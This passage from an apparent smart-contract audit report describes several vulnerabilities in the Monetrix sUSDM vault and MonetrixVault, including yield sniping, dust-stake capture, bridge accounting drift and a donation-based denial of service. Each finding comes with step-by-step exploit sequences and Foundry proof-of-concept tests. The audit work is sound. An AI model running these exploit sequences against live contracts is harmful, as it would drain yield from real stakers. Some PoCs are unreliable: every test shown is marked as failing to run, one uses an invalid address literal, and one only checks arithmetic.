    bytes32 public constant GUARDIAN = keccak256("MONETRIX_GUARDIAN");
    bytes32 public constant UPGRADER = keccak256("MONETRIX_UPGRADER");
    bytes32 public constant OPERATOR = keccak256("MONETRIX_OPERATOR");
    function hasRole(bytes32, address) external pure returns (bool) { return true; }
}

contract SUSDMVirtualShareLeakTest is Test {
    MockUSDM usdm;
    MockConfig cfg;
    MockACL acl;
    sUSDM susdm;
    sUSDMEscrow escrow;
    address attacker = address(0xA11CE);
    address vault = address(0xBEEF);

    function setUp() public {
        usdm = new MockUSDM();
        cfg = new MockConfig();
        acl = new MockACL();
        susdm = new sUSDM();
        susdm.initialize(address(usdm), address(cfg), address(acl));
        escrow = new sUSDMEscrow(address(usdm), address(susdm));
        susdm.setEscrow(address(escrow));
        susdm.setVault(vault);
    }

    function testDustSupplyCapturesAndStrandsYield() public {
        usdm.mint(attacker, 1);
        vm.startPrank(attacker);
        usdm.approve(address(susdm), 1);
        susdm.deposit(1, attacker);
        vm.stopPrank();

        assertEq(susdm.totalSupply(), 1e6);

        uint256 injected = 1_000_000e6;
        usdm.mint(vault, injected);
        vm.startPrank(vault);
        usdm.approve(address(susdm), injected);
        susdm.injectYield(injected);
        vm.stopPrank();

        uint256 beforeAssets = susdm.totalAssets();
        vm.prank(attacker);
        uint256 requestId = susdm.cooldownShares(susdm.balanceOf(attacker));

        (,, uint256 owed,,) = susdm.unstakeRequests(requestId);
        assertGt(owed, injected / 2 - 2);
        assertGt(susdm.totalAssets(), injected / 2 - 2);
        assertEq(susdm.totalSupply(), 0);
        assertGt(beforeAssets - owed, 499_000e6);
    }
}

## Suggested Mitigation
Make share decimals and ERC4626 virtual-share math consistent. If sUSDM must report 6 decimals and start at a displayed 1:1 USDM:sUSDM rate, set `_decimalsOffset()` to 0. Additionally, reject `injectYield` while `totalSupply()` is below a meaningful minimum or route yield elsewhere until sufficient real shares exist, and ensure `convertToAssets(totalSupply())` can claim essentially all vault assets when there are no pending claims.
```

### M-27 / `MMwYCWdiyDhSE3uCKAhFF`
- Finding title: Late deposits can frontrun sUSDM.injectYield and capture yield accrued before they joined
- Report lines: 2673-2804
```md
## [M-27]. Late deposits can frontrun sUSDM.injectYield and capture yield accrued before they joined

## id: MMwYCWdiyDhSE3uCKAhFF

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
FrontrunMev

## Location
sUSDM.injectYield

## Finding Status: Valid
### Finding Status Justification: The code has no mechanism that distinguishes shares held during yield accrual from shares minted immediately before injectYield. A frontrunner can deposit before a visible vault injection, receive shares at the old exchange rate, and after injectYield their shares are worth a pro-rata share of the transferred yield. cooldownShares lets the attacker lock that increased value subject to the normal cooldown. This does not require user error or privileged misconfiguration, only ordering/capital around a yield injection. It is the same class as the public V12 late-staker issue, but the finding severity differs from V12, so it remains in scope under the supplied duplicate rule.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
sUSDM distributes each yield injection to whatever shares exist at the moment injectYield executes. deposit() and mint() remain permissionless before the vault transaction, and injectYield() simply transfers USDM into the vault balance, raising totalAssets()/totalSupply() for all current holders. There is no snapshot of eligible supply at yield accrual/settlement time and no user reward-debt/index tracking. Vulnerable snippet: function deposit(uint256 assets, address receiver) public override nonReentrant whenNotPaused returns (uint256) { return super.deposit(assets, receiver); } function injectYield(uint256 usdmAmount) external onlyVault nonReentrant { require(totalSupply() > 0, "sUSDM: no stakers"); IERC20(asset()).safeTransferFrom(msg.sender, address(this), usdmAmount); totalYieldInjected += usdmAmount; lastCumulativeYield = (totalAssets() * 1e18) / totalSupply(); } A mempool observer can deposit immediately before a visible yield injection, receive shares at the pre-yield exchange rate, then cooldown those shares after injection and lock a claim that includes a pro-rata share of yield generated before the attacker participated.

## Impact
Long-term sUSDM holders lose a proportional share of pending/in-motion yield to late joiners. The stolen amount is approximately injectedYield * attackerDeposit / (existingAssets + attackerDeposit), less rounding and cooldown opportunity cost. Principal is not directly stolen, so severity is Medium.

## Command to Run Test


## Proof of Concept
1. Alice stakes 1,000 USDM and is the only long-term sUSDM holder. 2. The vault is about to call injectYield(100 USDM); the transaction is visible in the mempool or orderable by a builder. 3. The attacker frontruns with deposit(9,000 USDM, attacker), minting shares at the old rate. 4. The vault injects 100 USDM, raising the exchange rate for Alice and the attacker's newly minted shares. 5. The attacker immediately calls cooldownShares() and locks roughly 9,090 USDM, profiting about 90 USDM of yield that accrued before they joined. 6. Alice receives only about 10 USDM of the 100 USDM injection instead of the full amount.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {sUSDM} from "../src/tokens/sUSDM.sol";
import {sUSDMEscrow} from "../src/tokens/sUSDMEscrow.sol";
import {MonetrixConfig} from "../src/core/MonetrixConfig.sol";
import {IMonetrixAccessController} from "../src/governance/IMonetrixAccessController.sol";

contract MockUSDM is ERC20 {
    constructor() ERC20("USDM", "USDM") {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract MockACL is IMonetrixAccessController {
    bytes32 public constant override GUARDIAN = keccak256("MONETRIX_GUARDIAN");
    bytes32 public constant override GOVERNOR = keccak256("MONETRIX_GOVERNOR");
    bytes32 public constant override UPGRADER = keccak256("MONETRIX_UPGRADER");
    bytes32 public constant override OPERATOR = keccak256("MONETRIX_OPERATOR");
    mapping(bytes32 => mapping(address => bool)) internal roles;
    function grant(bytes32 role, address account) external { roles[role][account] = true; }
    function hasRole(bytes32 role, address account) public view override returns (bool) { return roles[role][account]; }
    function checkRole(bytes32 role, address account) external view override { require(hasRole(role, account), "NO_ROLE"); }
}

contract SUSDMYieldSnipeTest is Test {
    address internal alice = address(0xA11CE);
    address internal attacker = address(0xB0B);
    address internal vault = address(0xVA017);

    MockUSDM internal usdm;
    MockACL internal acl;
    MonetrixConfig internal config;
    sUSDM internal susdm;

    function setUp() public {
        usdm = new MockUSDM();
        acl = new MockACL();
        acl.grant(acl.GOVERNOR(), address(this));

        MonetrixConfig configImpl = new MonetrixConfig();
        config = MonetrixConfig(address(new ERC1967Proxy(address(configImpl), abi.encodeCall(MonetrixConfig.initialize, (address(0xBEEF), address(0xCAFE), address(acl))))));

        sUSDM susdmImpl = new sUSDM();
        susdm = sUSDM(address(new ERC1967Proxy(address(susdmImpl), abi.encodeCall(sUSDM.initialize, (address(usdm), address(config), address(acl))))));

        sUSDMEscrow escrow = new sUSDMEscrow(address(usdm), address(susdm));
        susdm.setEscrow(address(escrow));
        susdm.setVault(vault);
    }

    function testLateJoinerCapturesPendingYield() public {
        uint256 aliceDeposit = 1_000e6;
        uint256 attackerDeposit = 9_000e6;
        uint256 yieldAmount = 100e6;

        usdm.mint(alice, aliceDeposit);
        vm.startPrank(alice);
        usdm.approve(address(susdm), type(uint256).max);
        susdm.deposit(aliceDeposit, alice);
        vm.stopPrank();

        usdm.mint(attacker, attackerDeposit);
        vm.startPrank(attacker);
        usdm.approve(address(susdm), type(uint256).max);
        susdm.deposit(attackerDeposit, attacker);
        vm.stopPrank();

        usdm.mint(vault, yieldAmount);
        vm.startPrank(vault);
        usdm.approve(address(susdm), yieldAmount);
        susdm.injectYield(yieldAmount);
        vm.stopPrank();

        uint256 attackerShares = susdm.balanceOf(attacker);
        vm.prank(attacker);
        uint256 requestId = susdm.cooldownShares(attackerShares);

        (,, uint256 lockedUsdm,, uint256 cooldownEnd) = susdm.unstakeRequests(requestId);
        assertGt(lockedUsdm, attackerDeposit + 80e6, "attacker captured most of the injected yield");

        vm.warp(cooldownEnd);
        vm.prank(attacker);
        susdm.claimUnstake(requestId);
        assertGt(usdm.balanceOf(attacker), attackerDeposit, "attacker exits with profit from prior yield");

        uint256 aliceAssets = susdm.convertToAssets(susdm.balanceOf(alice));
        assertLt(aliceAssets, aliceDeposit + yieldAmount, "long-term holder was diluted by late deposit");
    }
}


## Suggested Mitigation
Snapshot eligible sUSDM supply before yield becomes distributable and inject yield only against that snapshot, or move to per-user reward accounting with userRewardPerTokenPaid/rewardDebt so deposits after accrual do not receive historical yield. As a minimum, route yield through an epoch with a cutoff block and reject deposits from participating in the current distribution epoch.
```

### M-28 / `lLLeOnUDm_UY6WAA2ne10`
- Finding title: Supplied USDC is counted as bridgeable, allowing silent bridge drops to corrupt principal accounting
- Report lines: 2805-2878
```md
## [M-28]. Supplied USDC is counted as bridgeable, allowing silent bridge drops to corrupt principal accounting

## id: lLLeOnUDm_UY6WAA2ne10

## Derived From Pattern/Invariant
UncheckedLowLevelCallResults: external CoreWriter action has no post-condition and supplied balance is treated as immediately bridgeable

## Exploit Type
UncheckedReturn

## Location
MonetrixVault._sendL1Bridge

## Finding Status: Valid
### Finding Status Justification: _sendL1Bridge explicitly adds suppliedBalance when pmEnabled, but sendBridgeToL1 emits ACTION_SEND_ASSET, which spends spot USDC rather than 0x811 supplied balance. bridgePrincipalFromL1 decrements outstandingL1Principal before the action's actual L1 effect is confirmed. Thus, if only supplied USDC exists, the local availability check can pass while no EVM-side bridge credit occurs. No postcondition or pending bridge reconciliation protects the accounting.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
`_sendL1Bridge()` treats Portfolio Margin supplied USDC as available for an `ACTION_SEND_ASSET` bridge: `uint256 l1Available = uint256(PrecompileReader.spotBalance(address(this), usdcToken).total); if (pmEnabled) { l1Available += uint256(PrecompileReader.suppliedBalance(address(this), usdcToken)); } require(l1Available >= TokenMath.usdcEvmToL1Wei(amount), "L1 USDC insufficient"); ActionEncoder.sendBridgeToL1(amount);`. However the bridge action sends spot USDC; supplied 0x811 balances are a separate borrow/lend pool position that must be withdrawn with `withdrawFromBlp()` before they are spot-sendable. In `bridgePrincipalFromL1()`, the vault decrements `outstandingL1Principal` before dispatching the CoreWriter action: `outstandingL1Principal -= amount; _sendL1Bridge(amount);`. If the account has enough supplied USDC but insufficient spot USDC, the local require passes while the L1 action can be silently dropped or fail to move funds. There is no post-condition checking that EVM USDC was actually received, no L1 spot balance delta check, and no pending bridge state. The vault can therefore record principal as bridged back even though no bridge occurred.

## Impact
During redemption stress, an operator following the normal bridge-back path can consume `outstandingL1Principal` without receiving EVM USDC. Redemptions remain underfunded, future `bridgePrincipalFromL1()` calls are capped or blocked by the reduced principal counter, and recovery requires governance/raw L1 actions or an upgrade. This is a functional DoS/accounting drift rather than direct theft because the underlying L1 funds may still exist but are no longer bridgeable through the normal accounting path.

## Command to Run Test
forge test --match-contract SuppliedBalanceBridgeDropTest

## Proof of Concept
1. PM is enabled and the vault has 100 USDC supplied in 0x811 but zero spot USDC. 2. Pending redemptions create a 100 USDC shortfall. 3. The operator calls `bridgePrincipalFromL1(100e6)`. 4. `_sendL1Bridge()` adds spot plus supplied balances, so the availability check passes. 5. `ActionEncoder.sendBridgeToL1()` emits a SEND_ASSET action that cannot consume the supplied balance, so no EVM USDC arrives. 6. The transaction has already reduced `outstandingL1Principal` by 100e6 and emits `PrincipalBridgedFromL1`, leaving normal bridge-back accounting unable to retry the same principal.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;
import "forge-std/Test.sol";

contract BridgeAccountingModel {
    uint256 public outstandingL1Principal = 100e6;
    uint256 public evmUsdcReceived;
    uint256 public spotL1Wei;
    uint256 public suppliedL1Wei = 100e8;
    bool public pmEnabled = true;

    function bridgePrincipalFromL1(uint256 amount) external {
        require(amount > 0 && amount <= outstandingL1Principal, "invalid bridge amount");
        outstandingL1Principal -= amount;
        _sendL1Bridge(amount);
    }

    function _sendL1Bridge(uint256 amount) internal {
        uint256 l1Available = spotL1Wei;
        if (pmEnabled) l1Available += suppliedL1Wei;
        require(l1Available >= amount * 100, "L1 USDC insufficient");
        if (spotL1Wei >= amount * 100) {
            spotL1Wei -= amount * 100;
            evmUsdcReceived += amount;
        }
    }
}

contract SuppliedBalanceBridgeDropTest is Test {
    function testSuppliedBalancePassesCheckButNoBridgeArrives() public {
        BridgeAccountingModel m = new BridgeAccountingModel();
        m.bridgePrincipalFromL1(100e6);
        assertEq(m.outstandingL1Principal(), 0);
        assertEq(m.evmUsdcReceived(), 0);
    }
}

## Suggested Mitigation
Do not count `PrecompileReader.suppliedBalance()` as immediately bridgeable for `ACTION_SEND_ASSET`. Require the operator to withdraw supplied USDC to spot first, then bridge in a later transaction after verifying spot balance. Also avoid decrementing `outstandingL1Principal` until a verifiable bridge receipt or EVM USDC balance increase is observed, or introduce explicit pending bridge accounting that can be retried or cancelled.
```

### M-29 / `koX1oBSwdWmmvHkEW9rhM`
- Finding title: L1 bridge-back counts held HyperCore USDC as spendable and can permanently understate outstanding principal
- Report lines: 2879-3012
```md
## [M-29]. L1 bridge-back counts held HyperCore USDC as spendable and can permanently understate outstanding principal

## id: koX1oBSwdWmmvHkEW9rhM

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
MonetrixVault._sendL1Bridge

## Finding Status: Valid
### Finding Status Justification: The bridge-back check uses PrecompileReader.spotBalance(address(this), usdcToken).total and ignores hold. Held USDC may be included in total but unavailable for ACTION_SEND_ASSET. Since outstandingL1Principal is reduced before confirmed bridge completion, a venue-side silent drop can leave the principal stranded on L1 while normal and emergency bridge-back paths are capped by the reduced counter. The code contains no free-balance check or reconciliation step.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
`bridgePrincipalFromL1()` decrements `outstandingL1Principal` before dispatching the HyperCore bridge action, while `_sendL1Bridge()` only checks `spotBalance.total` and ignores `spotBalance.hold`. USDC locked in open L1 orders can therefore satisfy the local require even though it is not spendable for `ACTION_SEND_ASSET`. If HyperCore accepts the CoreWriter call but silently drops the L1 action, the EVM transaction still succeeds and principal accounting is reduced without any USDC arriving on EVM.

Vulnerable snippet:
`outstandingL1Principal -= amount; _sendL1Bridge(amount);`

`uint256 l1Available = uint256(PrecompileReader.spotBalance(address(this), usdcToken).total); ... require(l1Available >= TokenMath.usdcEvmToL1Wei(amount), ...); ActionEncoder.sendBridgeToL1(amount);`

The `SpotBalance` struct exposes `hold`, but the bridge availability check uses `total` instead of `total - hold`.

## Impact
A normal operator bridge-back during redemption stress can burn down `outstandingL1Principal` while no EVM USDC is received. This strands principal on HyperCore and can block future normal and emergency principal bridge-backs because both are capped by the now-understated `outstandingL1Principal`, leaving redemptions underfunded until an upgrade or out-of-band recovery.

## Command to Run Test


## Proof of Concept
1. The vault has 100 USDC of outstanding L1 principal.
2. All 100 USDC is included in HyperCore `spotBalance.total`, but it is also in `spotBalance.hold` because it is reserved by open L1 orders.
3. A redeemer creates a 100 USDC redemption shortfall.
4. The operator calls `bridgePrincipalFromL1(100e6)`.
5. `_sendL1Bridge()` accepts the amount because it checks `total`, not free balance.
6. HyperCore silently drops the bridge action because free USDC is zero.
7. The EVM transaction succeeds, `outstandingL1Principal` is decremented to zero, and no USDC arrives for redemptions.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {MonetrixVault} from "../src/core/MonetrixVault.sol";

contract MockUSDC is ERC20 {
    constructor() ERC20("USDC", "USDC") {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract MockACL {
    bytes32 public constant GUARDIAN = keccak256("MONETRIX_GUARDIAN");
    bytes32 public constant GOVERNOR = keccak256("MONETRIX_GOVERNOR");
    bytes32 public constant UPGRADER = keccak256("MONETRIX_UPGRADER");
    bytes32 public constant OPERATOR = keccak256("MONETRIX_OPERATOR");
    function hasRole(bytes32, address) external pure returns (bool) { return true; }
    function checkRole(bytes32, address) external pure {}
}

contract MockConfig {
    function bridgeInterval() external pure returns (uint256) { return 0; }
}

contract MockDepositWallet {
    IERC20 immutable token;
    constructor(IERC20 _token) { token = _token; }
    function deposit(uint256, uint32) external {}
    function depositFor(address, uint256 amount, uint32) external { token.transferFrom(msg.sender, address(this), amount); }
}

contract MockRedeemEscrow {
    uint256 public sf;
    function setShortfall(uint256 _sf) external { sf = _sf; }
    function shortfall() external view returns (uint256) { return sf; }
}

contract HeldBalanceBridgeBackPoC is Test {
    function testBridgeBackDecrementsPrincipalEvenWhenAllL1UsdcIsHeld() external {
        uint256 amount = 100e6;
        MockUSDC usdc = new MockUSDC();
        MockACL acl = new MockACL();
        MockConfig config = new MockConfig();
        MockDepositWallet depositWallet = new MockDepositWallet(IERC20(address(usdc)));
        MockRedeemEscrow redeemEscrow = new MockRedeemEscrow();

        MonetrixVault impl = new MonetrixVault();
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(impl),
            abi.encodeCall(
                MonetrixVault.initialize,
                (address(usdc), address(0xBEEF), address(0xCAFE), address(config), address(depositWallet), address(acl))
            )
        );
        MonetrixVault vault = MonetrixVault(address(proxy));
        vault.setAccountant(address(0xA11CE));
        vault.setYieldEscrow(address(0xE5C));
        vault.setRedeemEscrow(address(redeemEscrow));

        usdc.mint(address(vault), amount);
        vault.keeperBridge(MonetrixVault.BridgeTarget.Vault);
        assertEq(usdc.balanceOf(address(vault)), 0);
        assertEq(vault.outstandingL1Principal(), amount);

        redeemEscrow.setShortfall(amount);

        uint64 l1Held = uint64(amount * 100);
        vm.mockCall(
            address(0x0000000000000000000000000000000000000801),
            abi.encode(address(vault), uint64(0)),
            abi.encode(l1Held, l1Held, uint64(0))
        );

        vault.bridgePrincipalFromL1(amount);

        assertEq(vault.outstandingL1Principal(), 0, "principal accounting was consumed");
        assertEq(usdc.balanceOf(address(vault)), 0, "no EVM USDC arrived from the silently dropped L1 action");
    }
}

## Suggested Mitigation
Use free L1 USDC, not total L1 USDC, for bridge-back checks: read `SpotBalance memory bal = PrecompileReader.spotBalance(...)` and require `bal.total > bal.hold` and `bal.total - bal.hold >= TokenMath.usdcEvmToL1Wei(amount)`. Also move `outstandingL1Principal -= amount` behind a verifiable bridge-completion acknowledgement if HyperCore exposes one, or add a pending bridge state that can be retried/reconciled when the L1 action is not observed.
```

### H-30 / `zoFAMm4hl3fNnvAJpmz6w`
- Finding title: Dust sUSDM stake bypasses empty-vault reroute and captures pending user yield in MonetrixVault.distributeYield
- Report lines: 3013-3105
```md
## [H-30]. Dust sUSDM stake bypasses empty-vault reroute and captures pending user yield in MonetrixVault.distributeYield

## id: zoFAMm4hl3fNnvAJpmz6w

## Derived From Pattern/Invariant
ERC4626SharePriceMismatch

## Exploit Type
ERC4626SharePrice

## Location
MonetrixVault.distributeYield

## Finding Status: Valid
### Finding Status Justification: distributeYield only reroutes userShare when totalSupply is exactly zero. A permissionless user can create nonzero sUSDM supply before distribution and become the eligible share base. Because ERC4626 virtual shares dilute very tiny deposits, a 1-base-unit seed mostly strands yield, but an economically small seed such as 1 USDM can dominate the virtual offset and capture most of the injection when no legitimate stakers exist. The zero-supply check is not a sufficient safeguard. This differs in impact from the V12 virtual-share dust griefing item.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
MonetrixVault only reroutes the user yield share when sUSDM totalSupply is exactly zero. A permissionless attacker can deposit a tiny USDM amount into sUSDM immediately before an operator calls distributeYield(), making totalSupply nonzero and causing the vault to inject the full userShare into an economically tiny share base. Vulnerable snippet: `uint256 userShare = (totalYield * config.userYieldBps()) / 10000; if (userShare > 0 && susdm.totalSupply() == 0) { userShare = 0; } ... usdm.mint(address(this), userShare); IERC20(address(usdm)).forceApprove(address(susdm), userShare); susdm.injectYield(userShare);`. With no legitimate stakers, this yield would otherwise be routed to the foundation, but a dust/1 USDM seed staker can capture almost all of the userShare after the injection because they own nearly all real ERC4626 shares.

## Impact
A permissionless account can steal most of a pending distribution's user yield share when sUSDM has no meaningful existing stake. For a 1,000,000 USDC distribution with 70% userYieldBps, a 1 USDM seed stake can become claimable for roughly 700,000 USDM, diverting real settled yield from the intended foundation/protocol path.

## Command to Run Test


## Proof of Concept
1. Wait until YieldEscrow contains settled yield and sUSDM has zero or only attacker-controlled supply. 2. Mint or acquire a small amount of USDM and deposit it into sUSDM before the operator's distributeYield() transaction. 3. The vault sees susdm.totalSupply() != 0, so it does not zero userShare. 4. distributeYield() mints userShare USDM to itself and injects it into sUSDM. 5. The attacker owns nearly all real sUSDM shares and later exits through the cooldown flow, redeeming most of the injected userShare.

## Proof of Code
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {USDM} from "src/tokens/USDM.sol";
import {sUSDM} from "src/tokens/sUSDM.sol";
import {sUSDMEscrow} from "src/tokens/sUSDMEscrow.sol";
import {MonetrixConfig} from "src/core/MonetrixConfig.sol";
import {IMonetrixAccessController} from "src/governance/IMonetrixAccessController.sol";

contract ACL is IMonetrixAccessController {
    function GUARDIAN() external pure returns (bytes32) { return bytes32(uint256(1)); }
    function GOVERNOR() external pure returns (bytes32) { return bytes32(uint256(2)); }
    function UPGRADER() external pure returns (bytes32) { return bytes32(uint256(3)); }
    function OPERATOR() external pure returns (bytes32) { return bytes32(uint256(4)); }
    function hasRole(bytes32, address) public pure returns (bool) { return true; }
    function checkRole(bytes32, address) external pure {}
}

contract DustSeedYieldSnipingPoC is Test {
    USDM usdm;
    sUSDM susdm;
    MonetrixConfig config;
    ACL acl;

    function setUp() public {
        acl = new ACL();
        MonetrixConfig cfgImpl = new MonetrixConfig();
        config = MonetrixConfig(address(new ERC1967Proxy(address(cfgImpl), abi.encodeCall(MonetrixConfig.initialize, (address(0xBEEF), address(0xF00D), address(acl))))));
        USDM usdmImpl = new USDM();
        usdm = USDM(address(new ERC1967Proxy(address(usdmImpl), abi.encodeCall(USDM.initialize, (address(acl))))));
        sUSDM susdmImpl = new sUSDM();
        susdm = sUSDM(address(new ERC1967Proxy(address(susdmImpl), abi.encodeCall(sUSDM.initialize, (address(usdm), address(config), address(acl))))));
        sUSDMEscrow escrow = new sUSDMEscrow(address(usdm), address(susdm));
        usdm.setVault(address(this));
        susdm.setVault(address(this));
        susdm.setEscrow(address(escrow));
    }

    function testDustSeedCapturesAlmostAllInjectedUserYield() public {
        address attacker = address(0xA11CE);
        uint256 seed = 1e6;
        uint256 userShare = 700_000e6;
        usdm.mint(attacker, seed);
        vm.startPrank(attacker);
        usdm.approve(address(susdm), seed);
        susdm.deposit(seed, attacker);
        vm.stopPrank();
        usdm.mint(address(this), userShare);
        usdm.approve(address(susdm), userShare);
        susdm.injectYield(userShare);
        uint256 claimable = susdm.convertToAssets(susdm.balanceOf(attacker));
        assertGt(claimable, 699_000e6);
    }
}

## Suggested Mitigation
Do not use instantaneous nonzero totalSupply as the eligibility gate. Snapshot eligible sUSDM supply at settlement time, require a minimum stake age or minimum economically meaningful supply before routing userShare to sUSDM, and route userShare to the foundation when eligible supply is below that threshold.
```

### M-31 / `IjVPRntddtUJaBZS16kcA`
- Finding title: Late sUSDM deposits can capture yield settled before the shares existed
- Report lines: 3106-3191
```md
## [M-31]. Late sUSDM deposits can capture yield settled before the shares existed

## id: IjVPRntddtUJaBZS16kcA

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
AccountingInvariantViolation

## Location
MonetrixVault.distributeYield

## Finding Status: Valid
### Finding Status Justification: settle transfers yield to YieldEscrow without changing sUSDM.totalAssets. Until distributeYield runs, sUSDM deposits remain open and new shares are included in the live supply that receives injectYield. No snapshot exists at settle time and no deposit pause/eligibility delay protects already-settled yield. This is the same general root as the V12 pending-yield sniping issue, but the submitted severity is Medium while V12 listed it as High, so it is not excluded by the provided duplicate rule.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
`settle()` moves approved USDC yield into `YieldEscrow`, but this pending yield is excluded from `sUSDM.totalAssets()` until `distributeYield()` later mints USDM and calls `susdm.injectYield(userShare)`. Because `sUSDM.deposit()` remains open between those two phases, a user can join after the yield was collected and still be included in the current `susdm.totalSupply()` that receives the injection.

Vulnerable flow:
```solidity
function settle(uint256 proposedYield) external onlyOperator ... {
    IMonetrixAccountant(accountant).settleDailyPnL(proposedYield);
    usdc.safeTransfer(yieldEscrow, proposedYield);
    emit YieldCollected(proposedYield);
}

function distributeYield() external ... {
    uint256 totalYield = IYieldEscrow(yieldEscrow).balance();
    ...
    uint256 userShare = (totalYield * config.userYieldBps()) / 10000;
    ...
    usdm.mint(address(this), userShare);
    IERC20(address(usdm)).forceApprove(address(susdm), userShare);
    susdm.injectYield(userShare);
}
```
The allocation base is the live `sUSDM` supply at distribution time, not a checkpoint taken when yield was settled. This violates the invariant that a user should not receive yield recognized before their shares existed.

## Impact
Existing sUSDM holders lose a portion of already-settled but undistributed yield to late entrants who deposit immediately before `distributeYield()`. The loss scales with the attacker's temporary deposit size relative to existing supply.

## Command to Run Test


## Proof of Concept
1. Existing holder stakes USDM into sUSDM.
2. Operator calls `settle(Y)`, moving approved USDC yield into `YieldEscrow`; no sUSDM exchange-rate change occurs yet.
3. Attacker observes pending escrowed yield and deposits a large USDM amount into sUSDM before `distributeYield()`.
4. Operator calls `distributeYield()`.
5. `injectYield(userShare)` increases the exchange rate for all current shares, including the attacker's late shares.
6. Attacker cools down/unstakes later and exits with a share of yield that economically belonged to pre-settlement stakers.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";

contract LateJoinerCheckpointPocTest is Test {
    function testLateJoinerCapturesPreviouslySettledYield() public {
        uint256 oldAssets = 1_000e6;
        uint256 attackerAssets = 9_000e6;
        uint256 settledYieldUserShare = 700e6;

        uint256 oldShares = oldAssets;
        uint256 attackerShares = attackerAssets;
        uint256 totalSharesAtDistribution = oldShares + attackerShares;

        uint256 attackerYield = (settledYieldUserShare * attackerShares) / totalSharesAtDistribution;
        uint256 oldHolderYield = (settledYieldUserShare * oldShares) / totalSharesAtDistribution;

        assertGt(attackerYield, oldHolderYield, "late joiner captures majority of prior yield");
        assertEq(attackerYield, 630e6, "attacker receives yield from before joining");
    }
}


## Suggested Mitigation
Checkpoint the eligible sUSDM supply and per-user balances no later than `settle()`, then distribute that settled yield only to checkpointed shares. Alternatively, inject yield atomically in `settle()` or pause/newly gate sUSDM deposits while undistributed settled yield is pending.
```

### M-32 / `CBjsOJXof775M4MhOn7_o`
- Finding title: Donation over sUSDM injection cap can permanently DoS MonetrixVault.distributeYield
- Report lines: 3192-3327
```md
## [M-32]. Donation over sUSDM injection cap can permanently DoS MonetrixVault.distributeYield

## id: CBjsOJXof775M4MhOn7_o

## Derived From Pattern/Invariant
CheapGriefingOrDosProfit

## Exploit Type
Dos

## Location
MonetrixVault.distributeYield

## Finding Status: Valid
### Finding Status Justification: YieldEscrow.balance returns the raw USDC balance, and ordinary ERC20 transfers can donate USDC to the escrow. distributeYield always pulls and processes the full live balance; if the resulting userShare exceeds sUSDM.config().maxYieldPerInjection, injectYield reverts and the entire distribution reverts. There is no accounted-yield variable, partial distribution amount, or excess sweep path. This is related to the V12 live-escrow-balance issue, but the submitted severity differs, so it remains in scope under the stated duplicate rule.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
`distributeYield()` treats the live USDC balance of `YieldEscrow` as the amount that must be distributed and gives the operator no way to distribute a bounded/accounted amount. Because `YieldEscrow.balance()` is just `usdc.balanceOf(address(this))`, anyone can transfer USDC directly to the escrow. If the resulting `userShare` exceeds `sUSDM.config().maxYieldPerInjection()`, every `distributeYield()` call reverts inside `susdm.injectYield(userShare)`. Vulnerable flow:

uint256 totalYield = IYieldEscrow(yieldEscrow).balance();
...
uint256 userShare = (totalYield * config.userYieldBps()) / 10000;
...
susdm.injectYield(userShare); // reverts when userShare > maxYieldPerInjection

The grief can be extremely cheap when legitimate pending yield is already close to the cap: the attacker only needs to donate enough USDC to push `userShare` one wei over the limit. Since `distributeYield()` always uses the full live balance and `YieldEscrow` has no sweep or partial-pull path, yield distribution remains blocked until governance changes parameters or upgrades the system.

## Impact
sUSDM yield distribution can be halted, locking accrued yield in `YieldEscrow` and delaying or denying holder yield. Recovery requires privileged governance action rather than normal operator execution.

## Command to Run Test


## Proof of Concept
1. Legitimate settled yield accumulates in `YieldEscrow` near the per-injection cap.
2. Attacker transfers a small amount of USDC directly to `YieldEscrow`, which accepts ordinary ERC20 transfers.
3. `YieldEscrow.balance()` now reports a `totalYield` whose user split exceeds `maxYieldPerInjection`.
4. Operator calls `distributeYield()`.
5. Vault pulls the full balance and calls `susdm.injectYield(userShare)`, which reverts.
6. Because the whole transaction reverts and there is no partial distribution parameter, the same state bricks every retry.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../src/core/MonetrixVault.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract ACL {
    bytes32 public constant GOVERNOR = keccak256("MONETRIX_GOVERNOR");
    bytes32 public constant OPERATOR = keccak256("MONETRIX_OPERATOR");
    mapping(bytes32 => mapping(address => bool)) public roles;
    function grant(bytes32 r, address a) external { roles[r][a] = true; }
    function hasRole(bytes32 r, address a) external view returns (bool) { return roles[r][a]; }
}

contract T {
